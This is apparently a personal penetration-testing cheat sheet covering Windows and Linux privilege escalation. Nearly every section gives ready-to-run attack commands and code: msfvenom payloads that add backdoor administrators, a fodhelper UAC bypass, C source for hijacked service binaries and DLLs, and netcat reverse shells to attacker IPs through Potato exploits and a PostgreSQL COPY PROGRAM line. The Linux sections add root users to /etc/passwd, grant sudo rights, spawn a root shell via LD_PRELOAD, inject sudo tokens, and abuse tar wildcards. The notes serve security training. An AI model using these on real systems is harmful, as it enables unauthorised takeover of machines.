### Persmissions
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/8093ece9-bbd0-4055-bb7e-f6c8b381b848)
>The permissions on the root of the C: drive are typically more restrictive for security reasons2. Even though the Authenticated Users group has Modify access, this doesn’t override the restrictions placed on the root of the C: drive
##### check the created owner of folder
```
Get-ACL <FolderPath> | Select-Object Owner
```
### Windows
##### LOLBAS
https://lolbas-project.github.io/#  
(similar to gtfobins)
##### AutoEnumeration
winpeas.exe
##### Gain Interactive Shell after add user to local Administrator group
Require GUI access
```
1. runas /user:backupadmin cmd
2. open cmd as admin, input dave2 password
```
##### Powershell Script Block Logging
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/9c355e20-e841-4c1e-b384-9e53f05aaaa2)

##### Find process info
```
tasklist /fi "pid eq <PID>"
Get-Process -Id <PID>
Get-Process ProcessName
Get-Process ProcessName | Select-Object *
```
##### find service with filename
```
wmic service get name,pathname |  findstr /i "backup.exe"
```
##### Check which user runns this service
```
Get-Service -Name "RasMan" | Select-Object Name, Status, DisplayName, UserName
sc qc <service_name>
Get-WmiObject Win32_Process | Where-Object {$_.Name -eq "GPGService.exe"}
Get-WmiObject -Class Win32_Service -Filter "Name='GPGOrchestrator'" | Select-Object StartName,SystemName,StartMode,Name,DisplayName,CreationClassName,PathName,AcceptPause,AcceptStop,Caption,CheckPoint,Description,DesktopInteract,StartType
Get-WmiObject -Class Win32_Service -Filter "Name='GPGOrchestrator'" | Get-Member
(list all objects u can select for Get-WmiObject -Class Win32_Service -Filter "Name='GPGOrchestrator'" command)

```
##### Check which exe file using specific dll
```
tasklist /m dllname
tasklist /m (list all process using which dlls)
```

##### list relationship between Processes and Services (Windows can't list processes run by privileged users)
```
tasklist /svc
tasklist /svc /fi "imagename eq your_file.exe"
```
##### Service Actions
```
Start-Service -Name ""
Stop-Service -Name ""
sc stop servicename
sc start servicename
```

##### Powershell history
```
(Get-PSReadlineOption).HistorySavePath
```

##### Firewall
```
netsh advfirewall show currentprofile  
netsh advfirewall show allprofile  
netsh advfirewall firewall show rule name=all
```

##### Scheduled Tasks
```
schtasks /query /fo LIST /v
schtasks /query /v /fo list | findstr /i "backup.exe"
schtasks /query /fo LIST /v /tn "backup runner(taskname)" ----for retrieve full task info
Get-ScheduledTask | Where-Object {$_.TaskName -like '*backup*'}
schtasks /query /v /fo CSV | ConvertFrom-Csv | Select 'Author', 'TaskName', 'Task To Run', 'Run As User', 'Next Run Time','Schedule', 'Schedule Type', 'Repeat: Every'

icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

##### Enumerating Unmounted Disks
```
mountvol
```

##### Enumerating Device Drivers and Kernel Modules
```
1. driverquery /v /FO Table  
2. Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
```

##### Enumerating Binaries That AutoElevate
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi
```

##### Bypass UAC
```
1. check C:\Windows\System32\fodhelper.exe
2. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
3. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
4. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
5. run fodhelper.exe, whoami /groups
```

```
use exploit/windows/local/bypassuac_eventvwr
set session 1
set target 1(x64,0=x86)
Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
```

##### Insecure File Permissions
```
1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
2. icacls "service path" # check if current user has permission to replace file with malicious one
3. replace malicious exe with service executable
4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'" 
5. whoami /priv #check out shutdown privileges of user
```

##### Unquoted Service Paths
To list all unquoted service paths (minus built-in Windows services)
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """
```

```
Service Path:
C:\Program Files\My Program\My Service\service.exe
The Service will run the executable in path like this:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

1. check if current user has permission to place malicious bianry into subdirectories of unquoted service path
2. check which service runs this executable file
3. restart the service to receive rev shell or msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

```
Automatic Script:

cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

##### Service Binary Hijacking
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

First Way -- Add user to local Administrator group:
adduser.c:
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
```
Second Way -- Generating reverse shell file:
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.215 lport=1234 -f exe > backdoor.exe
move "C:\Program Files\MilleGPG5\GPGService.exe" C:\Users\Public\test.exe
certutil.exe -urlcache -split -f http://192.168.45.215:8080/backdoor.exe "C:\Program Files\MilleGPG5\GPGService.exe"
Restart-Service ServiceName
```
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
whoami /priv(if SeShutdownPrivilege isn't present,  we would have to wait for the victim to manually start the service)
shutdown /r /t 0

Automatic Script:
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Get-ModifiableServiceFile
```

##### Service DLL Hijacking
>The following is the default search order with SafeDllSearchMode enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode registry value and set it to 0 (default is enabled).
```
1.The directory from which the application loaded.
2.The system directory. Use the GetSystemDirectory function to get the path of this directory.(C:\Windows\System32)
3.The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (C:\Windows\System)
The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
(C:\Windows)
4.The current directory.
5.The directories that are listed in the PATH environment variable. Note that this does not include the per-application path
specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.
```

```
1. Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
2. Use Procmon64.exe(Process Monitor)(require admin privilege)(Bypass: copy the file to local, then use Procmon64.exe)
3. Checked for loaded dlls or missing dlls
4. replace dll with malicious file
5. PS: Restart-Service BetaService
```
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/d0995520-1ee4-4c84-88aa-b0b9e1360833)
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/b33e1fd2-993c-4c7b-ad5c-7c15b1bb232a)


>Each DLL can have an optional entry point function named DllMain, which is executed when processes or threads attach the DLL  
This function generally contains four cases named DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH
```
#include <stdlib.h>
#include <windows.h> //appened code
//name:myDLL.cpp

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add"); //appened code
  	    i = system ("net localgroup administrators dave2 /add"); //appened code
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

Cross-compile:
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

Replace and restart service:
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
Restart-Service BetaService
```

##### Named Pipes(PrintSpoofer)
```
Requirements: SeImpersonatePrivilege has to be enabled
Download address: wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
kali: iwr -uri http://192.168.45.214/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\

whoami
```
##### Godpotato
ImpersonatePrivilege permission required
```
GodPotato-NET4.exe
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.1.102(LHOST) 2012(LPORT)"
nc.exe -nlvp 2012

Affected version:
Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
```
##### Rogue Potato
ImpersonatePrivilege permission required
```
RoguePotato.exe -r 10.10.10.3(LHOST) -e "nc.exe 10.10.10.3 3001 -e cmd.exe" -l 9999
# In some old versions you need to use the "-f" param
RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999

nc.exe -nlvp 3001
```
##### SeRestorePrivilege To System
SeRestorePrivilege permission required

GUI Version:
```
.\EnableSeRestorePrivilege.ps1 (Enable SeRestore)
mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Kali: rdesktop victom_ip
Kali: win+U to skip credential input
```
Terminal Version:
```
.\EnableSeRestorePrivilege.ps1 (Enable SeRestore)
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
cmd.exe /c sc qc seclogon
upload nc.exe
.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 4444 -e powershell.exe"
```
##### PowerUp.ps1
```
Service Enumeration:
Get-ServiceUnquoted                 -   returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile           -   returns services where the current user can write to the service binary path or its config
Get-ModifiableService               -   returns services the current user can modify
Get-ServiceDetail                   -   returns detailed information about a specified service
Service Abuse:
Invoke-ServiceAbuse                 -   modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary                 -   writes out a patched C# service binary that adds a local admin or executes commands
Install-ServiceBinary               -   replaces a service binary with one that adds a local admin or executes commands
Restore-ServiceBinary               -   restores a replaced service binary with the original executable
DLL Hijacking:
Find-ProcessDLLHijack               -   finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack                  -   finds service %PATH% DLL hijacking opportunities
Write-HijackDll                     -   writes out a hijackable DLL
Registry Checks:
Get-RegistryAlwaysInstallElevated   -  checks if the AlwaysInstallElevated registry key is set
Get-RegistryAutoLogon               -   checks for Autologon credentials in the registry
Get-ModifiableRegistryAutoRun       -   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
Miscellaneous Checks:
Get-ModifiableScheduledTaskFile     -   find schtasks with modifiable target files
Get-UnattendedInstallFile           -   finds remaining unattended installation files
Get-Webconfig                       -   checks for any encrypted web.config strings
Get-ApplicationHost                 -   checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword                -   retrieves the plaintext passwords for any found McAfee's SiteList.xml files
Get-CachedGPPPassword               -   checks for passwords in cached Group Policy Preferences files
Other Helpers/Meta-Functions:
Get-ModifiablePath                  -   tokenizes an input string and returns the files in it the current user can modify
Get-CurrentUserTokenGroupSid        -   returns all SIDs that the current user is a part of, whether they are disabled or not
Add-ServiceDacl                     -   adds a Dacl field to a service object returned by Get-Service
Set-ServiceBinPath                  -   sets the binary path for a service to a specified value through Win32 API methods
Test-ServiceDaclPermission          -   tests one or more passed services or service names against a given permission set
Write-UserAddMSI                    -   write out a MSI installer that prompts for a user to be added
Invoke-AllChecks                    -   runs all current escalation checks and returns a report

Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
##### Windows.old
>Essentially, the Windows.old folder just contains the old Windows system. From the Windows system files to your installed programs and each user account’s settings and files, it’s all here. The new version of Windows just keeps it around in case you’d like to go back to that older version of Windows or in case you need to dig in and find a file.
```
1. Find SAM and SYSTEM file under Windows.old\Windows\System32\
2. download to kali
3. impacket-secretsdump -sam SAM -system SYSTEM local
```
##### Check Compressed files
```
check zip,gz,7z,stix,rar files
```
##### Runascs to lateral move 
```
runascs.exe username password powershell.exe -r lhost:lport
nc -nlvp 7777
```
##### Powershell to get interactive shell as another user
```
ps > $env:ComputerName
ps > $user = "CONTROL\hector"
ps > $pass = "l33th4x0rhector"
ps > $secstr = New-Object -TypeName System.Security.SecureString
ps > $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
ps > $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
ps > Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
ps > Invoke-Command -ScriptBlock {\windows\temp\nc.exe -e cmd 10.10.14.13 5555 } -computer localhost
```
##### Abusing Windows ACLs
Enumerate if some user has full control
```
get-acl HKLM:\SYSTEM\CurrentControlSet\Services | format-list
```
List all acl services
```
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *
```

### Linux
##### Directory Permissions
>A directory is handled differently from a file. Read access gives the right to consult the list of its contents (files and directories). Write access allows creating or deleting files. Finally, execute access allows crossing through the directory to access its contents (using the cd command, for example).
##### Check what sudo permissions the user has available to them
sudo -l (if anything interesting, go look for in GTFOBins)
##### AutoEnumeration
linpeas.sh
##### Nday exploits
```
CVE-2021-3156 sudo Baron Samedit 2 sudo 1.8.2-1.8.32,1.9.0-1.9.5 downloadlink:https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```
##### Kernel exploits
```
OS version:
cat /etc/issue  
cat /etc/*-release  
Kernel Version and Architecture: 
uname -a
```
##### GTFOBins
```
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
```
##### Editor PE
vim, less (if the editor has sudo privileges or is runned by root)
```
inside vim or less, after colon(:), execute !/bin/sh
```

##### Pspy - Unprivileged Linux Process Snooping
Pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

###### Find Usage
```
Enumerating all files writable by user stuart:
find / -type f -user stuart -perm -u=w 2>/dev/null  
Enumerating all files writable by group stuart
find / -type f -group stuart -perm -g=w 2>/dev/null
Enumerating all files writable by the current user
find / - type f -writable 2>/dev/null

-perm mode permission bits are exactly set
-perm -mode all of permission bits are set
-perm /mode any of permission bits are set
```  
##### Enumerating Unmounted Disks
mount  
lsblk  
cat /etc/fstab (/etc/fstab file lists all drives that will be mounted at boot time)
##### Enumerating Device Drivers and Kernel Modules
1. lsmod  
2. /sbin/modinfo libata  
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/20c73182-d439-43a4-a3b5-f1fee987821c)

##### Abusing Sudo
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/ac8768a1-fc9f-4828-a1cc-791d4cd20972)
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/be5f2545-b176-4def-8e9b-7a422814dc70)


##### SUID permissions (anything interesting, to look for in GTFOBins)
>SUID and SGID allow the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid)

find / -perm -u=s -type f 2>/dev/null
```
cp with suid perm:

cd /tmp
wget //192.168.1.108/passwd(get new /etc/passwd under /tmp)
cp passwd /etc/passwd

msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=1234 R
cp raj.sh /etc/cron.hourly/
ls -al /etc/cron.hourly/
```

```
vim.basic with suid:

vim.basic /etc/passwd
```

```
screen-4.5.0 with suid:
https://github.com/X0RW3LL/XenSpawn/blob/main/spawn.sh

sudo ./spawn.sh Xenial
sudo systemd-nspawn -M Xenial
#Spawning container MACHINE_NAME on /var/lib/machines/Xenial 
#Press ^] three times within 1s to kill container.

root@Xenial:gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
root@Xenial:~# gcc -o rootshell -L libhax.so rootshell.c

#transfer libhax.so and rootshell to target machine's /tmp/
cd /etc
umask 000 # because
screen(with suid) -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
screen(with suid) -ls # screen itself is setuid, so...
/tmp/rootshell

#To completely remove the container from your system, you can use machinectl as follows
kali@kali:sudo machinectl remove MACHINE_NAME
```
##### CAP_SETUID capability
The two perl binaries stand out as they have setuid capabilities enabled, along with the +ep flag specifying that these capabilities are effective and permitted
```
/usr/sbin/getcap -r / 2>/dev/null
```
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/d14b5115-a1a3-45fd-a23a-c4823198184f)
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/e7e8b730-4760-4848-849e-394aaca5c74e)

##### Cronjob to elevate privilege
Check if you have access with write permission on these files.  
Check inside the file, to find other paths with write permissions.
```
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```
##### Insecure file permission /etc/passwd
 ```
 1. check if users have write permission
 2. openssl passwd evil:
 $1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1
openssl passwd -1 -salt hack password123
 3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
 4. su root2, enter passwd as evil
 ```
##### Writable /etc/sudoers
```
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```
##### LD_PRELOAD and NOPASSWD
If LD_PRELOAD is explicitly defined in the sudoers file
```
Defaults        env_keep += LD_PRELOAD
```
Compile the following shared object using the C code below with gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```
Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so find
##### Sudo Inject
```
$ sudo whatever
[sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
```
exploit.sh
```
#!/bin/sh
# create an invalid sudo entry for the current shell
echo | sudo -S >/dev/null 2>&1
echo "Current process : $$"
cp activate_sudo_token /tmp/
chmod +x activate_sudo_token
# timestamp_dir=$(sudo --version | grep "timestamp dir" | grep -o '/.*')
# inject all shell belonging to the current user, our shell one :p
for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" | grep -v "^$$\$")
do
        echo "Injecting process $pid -> "$(cat "/proc/$pid/comm")
        echo 'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1")' \
                | gdb -q -n -p "$pid" >/dev/null 2>&1
done
```
Requirements  
Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).  
Current user must have living process that has a valid sudo token with the same uid.  
>The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
##### Postgresql to RCE
```
To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.

pg_read_server_files — allow reading files
pg_write_server_files — allow writing to files
pg_execute_server_program — allow executing commands directly into the operating system.

GRANT pg_execute_server_program TO username;
GRANT pg_read_server_files TO username;
GRANT pg_write_server_files TO username;


command execution:
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 1234 >/tmp/f';
```
##### Check Compressed files
```
check zip,gz,7z,stix,rar files
```

##### Abusing /etc/sudoers
```
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
##### Cron using a script with a wildcard (Wildcard Injection)
```
[root@RedHat_test ~]# man tar
 -c新建打包文件，同 -v一起使用 查看过程中打包文件名
 -v压缩或解压过程中，显示过程
 -f要操作的文件名
 -r表示增加文件，把要增加的文件追加在压缩文件的末尾
 -t表示查看文件，查看文件中的文件内容
 -x解压文件
 -z通过gzip方式压缩或解压，最后以.tar.gz 为后缀
 -j通过bzip2方式压缩或解压，最后以.tar.br2 为后缀。压缩后大小小于.tar.gz
 -u更新压缩文件中的内容
 -p保留绝对路径，即允许备份数据中含有根目录
 -P保留数据原来权限及属性
```
```
CronJob:
*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *

Solution:
cd /opt/admin
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > \
/opt/admin/pwn.sh
touch /opt/admin/--checkpoint=1
touch /opt/admin/--checkpoint-action=exec=sh\ pwn.sh
touch /tmp/backup.tar.gz

/tmp/bash -p

The Actual Bash Interpretation:
/opt/admin: tar -zxf /tmp/backup.tar.gz --checkpoint-action=exec=sh pwn.sh  --checkpoint=1  pwn.sh
```
